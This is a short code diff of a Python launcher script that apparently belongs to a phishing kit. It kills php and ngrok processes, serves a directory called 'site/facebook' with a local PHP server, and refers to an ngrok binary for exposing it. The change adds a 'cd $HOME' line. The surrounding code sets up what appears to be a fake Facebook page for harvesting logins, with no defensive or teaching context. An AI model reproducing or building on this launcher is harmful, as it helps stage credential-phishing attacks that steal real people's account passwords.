@@ -12,6 +12,7 @@ os.system("chmod +x /Abir/ngrok")
 
 
 os.system("killall php> /dev/null 2>&1")
+os.system("cd $HOME")
 os.system("killall ngrok> /dev/null 2>&1 || killall /Abir/ngrok> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
 #os.system("chmod +x./ngrok")
